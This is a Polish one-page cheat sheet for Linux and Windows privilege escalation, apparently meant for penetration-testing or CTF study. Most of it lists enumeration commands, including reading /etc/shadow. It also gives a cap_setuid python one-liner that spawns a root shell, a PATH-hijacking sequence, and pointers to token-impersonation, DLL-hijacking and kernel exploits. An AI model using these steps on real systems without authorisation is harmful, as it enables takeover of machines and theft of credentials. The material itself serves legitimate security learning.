# PrivEsc-Cheatsheet

🐧 LINUX PRIVESC – 1 STRONA A4 CHEATSHEET
🔍 1. Informacje o systemie
uname -a              # Kernel – sprawdź podatności
cat /etc/os-release   # Dystrybucja
hostnamectl

👤 2. Użytkownicy / uprawnienia
id
whoami
sudo -l               # KLUCZOWE – błędne sudo = ROOT
cat /etc/passwd
cat /etc/shadow       # jeśli masz dostęp = wygrana

📦 3. SUID / SGID
find / -perm -4000 -type f 2>/dev/null


Sprawdź w GTFOBins (najczęstsze rootowanie):

vim, find, nmap, python, perl, bash

🧩 4. Capabilities
getcap -r / 2>/dev/null


Niebezpieczne:

python3 cap_setuid

perl cap_setuid

Root:

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

🔄 5. Cronjobs
crontab -l
ls -la /etc/cron*


Jeśli cron uruchamia edytowalny plik → ROOT.

📁 6. Uprawnienia do plików
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null


Edytowalne skrypty systemowe = eskalacja.

🛠️ 7. Usługi / procesy
ss -tulpn
ps aux


Słabe serwisy działające jako root → exploity lokalne / kernelowe.

🧵 8. PATH Hijacking
echo '/bin/bash' > fake
chmod +x fake
export PATH=.:$PATH
sudo <komenda>

🎯 9. Kernel Exploits (LAB only)
uname -r
searchsploit linux kernel


Dirty COW, Dirty Pipe, OverlayFS, itp.

✔️ Najważniejsze narzędzia

GTFOBins

HackTricks Linux

PayloadAllTheThings

🪟 WINDOWS PRIVESC – 1 STRONA A4 CHEATSHEET
🔍 1. Informacje o systemie
systeminfo
hostname
whoami /all


Szukaj: brakujących łatek, starych buildów, podatnych uprawnień.

👥 2. Użytkownicy / grupy
net users
net localgroup
net user <USER>

🔑 3. Uprawnienia użytkownika
whoami /priv


Jeśli widzisz:

SeImpersonatePrivilege

SeAssignPrimaryTokenPrivilege

→ Użyj: PrintSpoofer / JuicyPotato / RoguePotato

⏰ 4. Scheduled Tasks (cron Windows)
schtasks /query /fo LIST /v


Edytowalny task uruchamiany jako SYSTEM = eskalacja.

🧮 5. Usługi
sc query
tasklist /v


Możliwe:

DLL Hijacking

Nadpisywanie binarki usługi

📁 6. Uprawnienia do plików i katalogów
icacls <plik>
icacls C:\ /findsid <user>


Jeśli możesz nadpisać plik usługi → SYSTEM.

🔌 7. Porty / lokalne usługi
netstat -ano


Słuchające usługi debug/RPC/WCF → lokalne exploity + privesc.

🧵 8. DLL Hijacking

Edytowalny folder w ścieżce ładowania DLL → własna DLL → restart usługi → SYSTEM.

📦 9. Must‑have narzędzia

WinPEAS

Seatbelt

PowerUp.ps1

PrivescCheck.ps1

Watson

✔️ Najważniejsze strony

LOLBAS

HackTricks Windows

PayloadAllTheThings
